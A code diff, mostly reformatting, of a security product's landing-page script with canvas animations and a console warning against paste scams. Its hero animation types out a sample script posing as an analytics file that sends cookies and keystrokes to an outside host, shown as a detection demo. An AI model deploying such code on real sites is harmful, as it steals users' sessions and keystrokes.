@@ -33,9 +33,9 @@ const raf = requestAnimationFrame;
         const DPR = window.devicePixelRatio || 1;
         W = window.innerWidth;
         H = window.innerHeight;
-        canvas.style.width  = W + 'px';
+        canvas.style.width = W + 'px';
         canvas.style.height = H + 'px';
-        canvas.width  = Math.round(W * DPR);
+        canvas.width = Math.round(W * DPR);
         canvas.height = Math.round(H * DPR);
         ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
     }
@@ -126,7 +126,10 @@ const raf = requestAnimationFrame;
     let resizeTimer;
     window.addEventListener('resize', () => {
         clearTimeout(resizeTimer);
-        resizeTimer = setTimeout(() => { resize(); cacheGradients(); }, 150);
+        resizeTimer = setTimeout(() => {
+            resize();
+            cacheGradients();
+        }, 150);
     });
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) raf(draw);
@@ -151,7 +154,7 @@ qsa('.cracked-word').forEach(el => {
     const el = qs('#heroCode');
     if (!el) return;
 
-    const card    = el.closest('.threat-card');
+    const card = el.closest('.threat-card');
     const codeArea = el;
 
     /* Lock only the CODE AREA height so typewriter never reflows the card */
@@ -165,23 +168,25 @@ qsa('.cracked-word').forEach(el => {
     const labelEl = qs('#heroThreatLabel');
 
     function hexToRgba(hex, a) {
-        const r = parseInt(hex.slice(1,3),16), g = parseInt(hex.slice(3,5),16), b = parseInt(hex.slice(5,7),16);
+        const r = parseInt(hex.slice(1, 3), 16),
+            g = parseInt(hex.slice(3, 5), 16),
+            b = parseInt(hex.slice(5, 7), 16);
         return `rgba(${r},${g},${b},${a})`;
     }
 
     const LEVELS = {
-        safe:     { label: 'SAFE',            color: '#4ade80' },
-        low:      { label: 'LOW RISK',        color: '#a3e635' },
-        medium:   { label: 'MEDIUM RISK',     color: '#facc15' },
-        high:     { label: 'HIGH RISK',       color: '#fb923c' },
+        safe: { label: 'SAFE', color: '#4ade80' },
+        low: { label: 'LOW RISK', color: '#a3e635' },
+        medium: { label: 'MEDIUM RISK', color: '#facc15' },
+        high: { label: 'HIGH RISK', color: '#fb923c' },
         critical: { label: 'CRITICAL THREAT', color: '#f87171' },
     };
 
     const BAR_GRAD = {
-        safe:     'linear-gradient(90deg,#4ade80,#22c55e)',
-        low:      'linear-gradient(90deg,#a3e635,#65a30d)',
-        medium:   'linear-gradient(90deg,#facc15,#d97706)',
-        high:     'linear-gradient(90deg,#fb923c,#dc2626)',
+        safe: 'linear-gradient(90deg,#4ade80,#22c55e)',
+        low: 'linear-gradient(90deg,#a3e635,#65a30d)',
+        medium: 'linear-gradient(90deg,#facc15,#d97706)',
+        high: 'linear-gradient(90deg,#fb923c,#dc2626)',
         critical: 'linear-gradient(90deg,#f87171,#fb923c)',
     };
 
@@ -222,23 +227,26 @@ qsa('.cracked-word').forEach(el => {
     function setLevel(name) {
         const { label, color } = LEVELS[name];
         if (card) {
-            card.style.transition    = 'border-color 1.6s ease, box-shadow 1.6s ease';
-            card.style.borderColor   = hexToRgba(color, 0.28);
-            card.style.boxShadow     = `0 0 40px ${hexToRgba(color, 0.07)}, 0 0 0 1px ${hexToRgba(color, 0.1)} inset`;
+            card.style.transition = 'border-color 1.6s ease, box-shadow 1.6s ease';
+            card.style.borderColor = hexToRgba(color, 0.28);
+            card.style.boxShadow = `0 0 40px ${hexToRgba(color, 0.07)}, 0 0 0 1px ${hexToRgba(color, 0.1)} inset`;
         }
         if (codeArea) codeArea.style.borderLeftColor = hexToRgba(color, 0.28);
-        if (scoreEl)  scoreEl.style.color = color;
-        if (barFillEl) { barFillEl.style.background = BAR_GRAD[name]; barFillEl.style.boxShadow = `0 0 8px ${hexToRgba(color, 0.45)}`; }
+        if (scoreEl) scoreEl.style.color = color;
+        if (barFillEl) {
+            barFillEl.style.background = BAR_GRAD[name];
+            barFillEl.style.boxShadow = `0 0 8px ${hexToRgba(color, 0.45)}`;
+        }
         if (card) card.querySelectorAll('.threat-card__header svg path').forEach(p => p.setAttribute('stroke', color));
         scrambleLabel(label, color);
     }
 
     const lines = [
-        { txt: '// analytics.min.js v2.3.1',     cls: 'c-comment' },
-        { txt: '(function(w, d) {',              cls: 'c-kw' },
+        { txt: '// analytics.min.js v2.3.1', cls: 'c-comment' },
+        { txt: '(function(w, d) {', cls: 'c-kw' },
         { txt: '  var _orig = d.createElement;', cls: null },
         { txt: "  d['createElement'] = (tag) => {", cls: 'c-kw' },
-        { txt: "    if (tag === 'script') {",    cls: null },
+        { txt: "    if (tag === 'script') {", cls: null },
         { txt: '      var xhr = new XMLHttpRequest();', cls: 'c-fn' },
         { txt: "      xhr.open('POST','//cdn-io.net/t',!0);", cls: 'c-fn' },
         { txt: "      xhr.send(btoa(d.cookie+location));", cls: 'c-str' },
@@ -246,19 +254,20 @@ qsa('.cracked-word').forEach(el => {
         { txt: "  d.addEventListener('keydown',", cls: 'c-kw' },
         { txt: '    e => navigator.sendBeacon(', cls: 'c-fn' },
         { txt: "      '//cdn-io.net/k', e.key));", cls: 'c-str' },
-        { txt: '})(window, document);',          cls: null },
+        { txt: '})(window, document);', cls: null },
     ];
 
     /* Detection UI elements */
-    const scoreEl    = qs('#heroScore');
-    const barFillEl  = qs('#heroBarFill');
-    const ruleEls    = [0,1,2,3].map(i => qs('#heroRule'    + i));
-    const rulePctEls = [0,1,2,3].map(i => qs('#heroRulePct' + i));
+    const scoreEl = qs('#heroScore');
+    const barFillEl = qs('#heroBarFill');
+    const ruleEls = [0, 1, 2, 3].map(i => qs('#heroRule' + i));
+    const rulePctEls = [0, 1, 2, 3].map(i => qs('#heroRulePct' + i));
 
     function animateNum(el, target, decimals, suffix, duration) {
         if (!el) return;
         const start = parseFloat(el.textContent) || 0;
         const t0 = performance.now();
+
         function step(now) {
             const p = Math.min((now - t0) / duration, 1);
             const ease = 1 - Math.pow(1 - p, 3);
@@ -282,16 +291,16 @@ qsa('.cracked-word').forEach(el => {
 
     /* Milestones fire after the line at that index finishes typing */
     const MILESTONES = {
-        1:  {                    score:  9.2, bar:  6 },
-        2:  { level: 'low',      score: 17.4, bar: 12 },
-        3:  { level: 'medium',   score: 34.8, bar: 24, rules: [{i:0, pct:34}] },
-        4:  {                    score: 44.1, bar: 33 },
-        6:  { level: 'high',     score: 58.7, bar: 46, rules: [{i:0, pct:59}, {i:1, pct:28}] },
-        7:  {                    score: 71.3, bar: 63, rules: [{i:1, pct:62}] },
-        8:  { level: 'critical', score: 77.6, bar: 72 },
-        9:  {                    score: 81.2, bar: 75, rules: [{i:2, pct:24}] },
-        11: {                    score: 88.9, bar: 82, rules: [{i:2, pct:71}, {i:3, pct:38}] },
-        12: {                    score: 93.46, bar: 93.46, rules: [{i:0, pct:96}, {i:1, pct:94}, {i:2, pct:88}, {i:3, pct:76}] },
+        1: { score: 9.2, bar: 6 },
+        2: { level: 'low', score: 17.4, bar: 12 },
+        3: { level: 'medium', score: 34.8, bar: 24, rules: [{ i: 0, pct: 34 }] },
+        4: { score: 44.1, bar: 33 },
+        6: { level: 'high', score: 58.7, bar: 46, rules: [{ i: 0, pct: 59 }, { i: 1, pct: 28 }] },
+        7: { score: 71.3, bar: 63, rules: [{ i: 1, pct: 62 }] },
+        8: { level: 'critical', score: 77.6, bar: 72 },
+        9: { score: 81.2, bar: 75, rules: [{ i: 2, pct: 24 }] },
+        11: { score: 88.9, bar: 82, rules: [{ i: 2, pct: 71 }, { i: 3, pct: 38 }] },
+        12: { score: 93.46, bar: 93.46, rules: [{ i: 0, pct: 96 }, { i: 1, pct: 94 }, { i: 2, pct: 88 }, { i: 3, pct: 76 }] },
     };
 
     function fireMilestone(idx) {
@@ -305,8 +314,11 @@ qsa('.cracked-word').forEach(el => {
 
     function resetDetection() {
         setLevel('safe');
-        if (scoreEl)   scoreEl.textContent = '0.00%';
-        if (barFillEl) { barFillEl.style.transition = 'none'; barFillEl.style.width = '0%'; }
+        if (scoreEl) scoreEl.textContent = '0.00%';
+        if (barFillEl) {
+            barFillEl.style.transition = 'none';
+            barFillEl.style.width = '0%';
+        }
         ruleEls.forEach((el, i) => {
             if (!el) return;
             el.classList.remove('rule-visible');
@@ -339,6 +351,7 @@ qsa('.cracked-word').forEach(el => {
         }
 
         function rndGlyph() { return GLITCH[Math.floor(Math.random() * GLITCH.length)]; }
+
         function render() { el.textContent = grid.map(r => r.join('')).join('\n'); }
 
         let idx = 0;
@@ -396,9 +409,10 @@ qsa('.cracked-word').forEach(el => {
 
         const line = lines[lineIdx];
         if (charIdx <= line.txt.length) {
-            const partial = line.txt.slice(0, charIdx);
-            const cls = line.cls ? ` class="${line.cls}"` : '';
-            const lineHtml = cls ?
+            const
+                partial = line.txt.slice(0, charIdx),
+                cls = line.cls ? ` class="${line.cls}"` : '',
+                lineHtml = cls ?
                 `<span${cls}>${escHtml(partial)}<span class="cursor">▌</span></span>` :
                 escHtml(partial) + '<span class="cursor">▌</span>';
 
@@ -438,27 +452,29 @@ qsa('.cracked-word').forEach(el => {
 
     /* Scale a canvas to physical pixels, keep CSS size unchanged */
     function scaleCanvas(c) {
-        const lw = c.width, lh = c.height;
-        c.style.width  = lw + 'px';
+        const lw = c.width,
+            lh = c.height;
+        c.style.width = lw + 'px';
         c.style.height = lh + 'px';
-        c.width  = Math.round(lw * DPR);
+        c.width = Math.round(lw * DPR);
         c.height = Math.round(lh * DPR);
         return { lw, lh };
     }
 
-    const LAYERS = [
-        {
-            canvas: c1, ...scaleCanvas(c1),
-            left:  { n: 8, color: '#00d4ff' },
+    const LAYERS = [{
+            canvas: c1,
+            ...scaleCanvas(c1),
+            left: { n: 8, color: '#00d4ff' },
             right: { n: 8, color: '#a78bfa' },
-            connColor:  'rgba(0,212,255,0.06)',
+            connColor: 'rgba(0,212,255,0.06)',
             activeConn: 'rgba(0,212,255,0.35)',
         },
         {
-            canvas: c2, ...scaleCanvas(c2),
-            left:  { n: 6, color: '#a78bfa' },
+            canvas: c2,
+            ...scaleCanvas(c2),
+            left: { n: 6, color: '#a78bfa' },
             right: { n: 1, color: '#00ff88' },
-            connColor:  'rgba(167,139,250,0.1)',
+            connColor: 'rgba(167,139,250,0.1)',
             activeConn: 'rgba(0,255,136,0.6)',
         },
     ];
@@ -473,16 +489,25 @@ qsa('.cracked-word').forEach(el => {
     }
 
     LAYERS.forEach(L => {
-        L.leftX  = PAD + NODE_R + 2;
+        L.leftX = PAD + NODE_R + 2;
         L.rightX = L.lw - PAD - NODE_R - 2;
-        L.leftY  = buildPositions(L.left.n,  L.lh);
+        L.leftY = buildPositions(L.left.n, L.lh);
         L.rightY = buildPositions(L.right.n, L.lh);
     });
 
     /* Draw one layer for a given animation tick */
     function drawLayer(L, tick) {
-        const { canvas, lw, lh, left, right, connColor, activeConn,
-                leftX, rightX, leftY, rightY } = L;
+        const {
+            canvas,
+            left,
+            right,
+            connColor,
+            activeConn,
+            leftX,
+            rightX,
+            leftY,
+            rightY
+        } = L;
         const ctx = canvas.getContext('2d');
 
         ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -528,7 +553,7 @@ qsa('.cracked-word').forEach(el => {
                 ctx.stroke();
             });
         }
-        drawNodes(leftX,  leftY,  left.color);
+        drawNodes(leftX, leftY, left.color);
         drawNodes(rightX, rightY, right.color);
 
         ctx.restore();
@@ -882,4 +907,11 @@ qsa('.cracked-word').forEach(el => {
             btn.setAttribute('aria-expanded', 'true');
         }
     });
+})();
+
+/* ══════════════════════════════════════════════════
+   14. CONSOLE WARNING
+══════════════════════════════════════════════════ */
+(function() {
+    console.log("%cDo not run code you don't understand! If someone told you to copy-paste something here, it could be a scam or exploit.", "color: #f87171; border: 3px solid #f87171; font-size: 24px; font-weight: bold; padding: 8px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;");
 })();
